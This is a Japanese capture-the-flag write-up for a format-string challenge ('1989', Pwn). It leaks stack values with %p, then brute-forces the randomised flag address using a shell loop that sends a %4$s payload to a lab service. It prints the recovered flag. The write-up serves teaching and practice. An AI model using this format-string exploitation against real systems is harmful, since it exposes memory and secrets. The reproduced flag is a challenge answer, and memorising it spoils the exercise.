# 1989:Pwn:200pts
脆弱性を調査し、フラグを入手してください。  
`nc 10.1.1.10 13030`  
この設問では Linux ターミナルを使用します。  
[https://ctf.setodanote.net/webshell/](https://ctf.setodanote.net/webshell/)  

# Solution
ソースコードは配布されていない。  
指定されたターミナルを使用すると次のようであった。  
```bash
user@09d9160a1c57:~$ nc 10.1.1.10 13030
===========================================================
   _______          ________            __ ____  _  _   
  / ____\ \        / /  ____|          /_ |___ \| || |  
 | |     \ \  /\  / /| |__     ______   | | __) | || |_ 
 | |      \ \/  \/ / |  __|   |______|  | ||__ <|__   _|
 | |____   \  /\  /  | |____            | |___) |  | |  
  \_____|   \/  \/   |______|           |_|____/   |_|  
                                                        
========================================================== 

        | 
flag    | [0x5659a060] >> flag is here << 
        | 

Ready > flag
Your Inpur : flag
```
CWE-134ということはFSBらしい。  
`%p %p %p %p %p`を入力する。  
```bash
user@09d9160a1c57:~$ nc 10.1.1.10 13030
~~~
        | 
flag    | [0x565cf060] >> flag is here << 
        | 

Ready > %p %p %p %p %p
Your Inpur : 0xffddabc0 0xffddafc8 0x565cc306 0x25207025 0x70252070
```
`0x25207025`が上から四番目にあるために、ここをflagのアドレスにして読み取ればよい。  
アドレスがランダム化されているため、flagのアドレスは`0x56XXX060`で変動する。  
総当たりできそうなので`0x56606060`に決め打ちし以下のように何度も試行する。  
```bash
user@09d9160a1c57:~$ for ((i=0; i<256; i++)); do echo -e "\x60\x60\x60\x56%4\$s" | nc 10.1.1.10 13030 | grep flag{; done
Ready > Your Inpur : ```Vflag{Homenum_Revelio_1989}
```
flagが得られた(チームメンバーが先に解いていた)。  
ちなみに[Shellcode](../Shellcode)で用いた[スクリプト](exploit.py)を流用すると総当たりは不要である。  

## flag{Homenum_Revelio_1989}